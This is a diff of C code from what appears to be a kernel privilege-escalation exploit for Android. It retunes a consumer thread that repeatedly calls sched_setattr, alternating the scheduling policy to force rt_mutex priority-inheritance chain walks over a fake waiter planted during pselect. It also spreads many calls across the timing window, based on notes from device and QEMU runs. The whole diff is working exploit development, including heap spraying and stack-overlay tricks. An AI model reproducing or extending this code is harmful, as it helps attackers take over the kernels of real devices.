@@ -126,10 +126,6 @@ void *consumer_thread(void *arg __attribute__((unused))) {
 
   int seen = 0;
   int heap_spray_done = 0;
-  /* Monotonic across the whole route: every attempt targets the SAME waiter
-   * thread, so each call must raise nice by one to force a real reschedule
-   * (see the comment at the sched_setattr call below). */
-  int consumer_nice_seq = 0;
 
   while (!atomic_load(&punch_consume_stop)) {
     int seq = atomic_load(&punch_consume_go);
@@ -216,60 +212,65 @@ void *consumer_thread(void *arg __attribute__((unused))) {
       usleep((useconds_t)delay_usec);
     }
 
+    /* Fire MANY walks spread across the (now long) pselect window instead of
+     * exactly one. Device run #2 proved why: the single call landed ~100ms after
+     * arming (Android timer slack, not the 3ms we asked for) which was exactly
+     * the 100ms pselect slice boundary -- the overlay was already gone, so the
+     * walk read the clobbered stack and stored nothing. QEMU on this same kernel
+     * stores correctly when the walk runs while do_select is blocked. */
     int calls_this_seq = 0;
+    int walked_this_seq = 0;
     for (int burst = 0; burst < PSELECT_CONSUMER_BURST_CALLS; burst++) {
       if (atomic_load(&punch_consume_stop) || !atomic_load(&pselect_armed)) {
         break;
       }
-      /* The nice value MUST strictly INCREASE on every call:
-       *  - identical (policy, nice) makes __sched_setscheduler take the
-       *    `if (unlikely(policy == p->policy))` early-out (kernel/sched/core.c
-       *    5594) and `goto unlock`, which RETURNS 0 WITHOUT calling
-       *    rt_mutex_adjust_pi() -> no chain walk at all. Only the very first
-       *    call of the process (SCHED_OTHER -> SCHED_BATCH) ever changed the
-       *    policy, so attempts 2..8 were silent no-ops that still reported
-       *    success=1. THIS was the "walk never writes" blocker.
-       *  - a LOWER nice is a priority increase and needs CAP_SYS_NICE/
-       *    RLIMIT_NICE (EPERM for untrusted_app), so never go back down.
-       * nice 1..19 => SCHED_BATCH prio 121..139, always != the fake waiter's
-       * prio 3, so rt_mutex_waiter_equal() keeps letting the walk through. */
+      /* ALTERNATE the fair policy (see sched_setattr_tid_policy): identical
+       * (policy, nice) makes __sched_setscheduler take the `policy == p->policy`
+       * early-out (kernel/sched/core.c:5594) and `goto unlock`, returning 0
+       * WITHOUT calling rt_mutex_adjust_pi() -- no walk at all. Raising nice
+       * works too but only 19 times (lowering needs CAP_SYS_NICE), while the
+       * policy can be flipped forever. Both policies keep p->prio far from the
+       * fake waiter's prio 3, so rt_mutex_waiter_equal() lets the walk through. */
+      int want_policy = (calls_this_seq & 1) ? SCHED_OTHER : SCHED_BATCH;
       int consumer_nice =
-          env_int_range("PSELECT_CONSUMER_NICE_VALUE", 0, 0, 19);
-      if (consumer_nice <= 0) {
-        consumer_nice = ++consumer_nice_seq;
-        if (consumer_nice > PSELECT_CONSUMER_NICE) {
-          consumer_nice = PSELECT_CONSUMER_NICE;
-        }
-      }
-      errno = 0;
-      int nice_before = getpriority(PRIO_PROCESS, tid);
+          env_int_range("PSELECT_CONSUMER_NICE_VALUE", PSELECT_CONSUMER_NICE,
+                        0, 19);
+      int policy_before = sched_getscheduler(tid);
       atomic_fetch_add(&consumer_calls, 1);
       /* armed_pre/armed_post bracket the call: both 1 == the walk provably ran
        * while the waiter was inside pselect with the overlay installed. */
       int armed_pre = atomic_load(&pselect_armed);
       errno = 0;
-      long sched_ret = sched_setattr_tid(tid, consumer_nice);
+      long sched_ret = sched_setattr_tid_policy(tid, want_policy, consumer_nice);
       int sched_errno = errno;
       int armed_post = atomic_load(&pselect_armed);
-      errno = 0;
-      int nice_after = getpriority(PRIO_PROCESS, tid);
-      /* The nice value actually CHANGING is the only proof that
-       * __sched_setscheduler reached `change:` and therefore ran
-       * rt_mutex_adjust_pi(p) == the chain walk. sched_ret==0 alone is not
-       * (the no-op early-out returns 0 too). */
-      int walked = (sched_ret == 0 && nice_after != nice_before);
+      int policy_after = sched_getscheduler(tid);
+      /* The policy actually CHANGING is the proof that __sched_setscheduler
+       * reached `change:` and therefore ran rt_mutex_adjust_pi(p) == the chain
+       * walk. sched_ret==0 alone is not (the no-op early-out returns 0 too). */
+      int walked = (sched_ret == 0 && policy_after != policy_before);
       if (walked) {
         atomic_fetch_add(&consumer_success, 1);
+        walked_this_seq++;
       }
-      pr_success("ckpt: consumer walk seq=%d ret=%ld errno=%d nice=%d->%d "
-                 "want=%d walked=%d armed=%d/%d tid=%d\n",
-                 seq, sched_ret, sched_errno, nice_before, nice_after,
-                 consumer_nice, walked, armed_pre, armed_post, tid);
+      /* Only log the first few and then every 32nd: 200 fsync'd lines per
+       * attempt would dominate the log (and the timing). */
+      if (calls_this_seq < 3 || (calls_this_seq % 32) == 0 || !walked) {
+        pr_success("ckpt: consumer walk seq=%d call=%d ret=%ld errno=%d "
+                   "policy=%d->%d(want %d) nice=%d walked=%d armed=%d/%d "
+                   "tid=%d\n",
+                   seq, calls_this_seq, sched_ret, sched_errno, policy_before,
+                   policy_after, want_policy, consumer_nice, walked, armed_pre,
+                   armed_post, tid);
+      }
       calls_this_seq++;
       if (calls_this_seq >= CONSUMER_MAX_CALLS) {
         break;
       }
+      usleep(PSELECT_CONSUMER_GAP_USEC);
     }
+    pr_success("ckpt: consumer seq=%d done calls=%d walked=%d\n",
+               seq, calls_this_seq, walked_this_seq);
     atomic_store(&punch_consume_go, 0);
   }
 
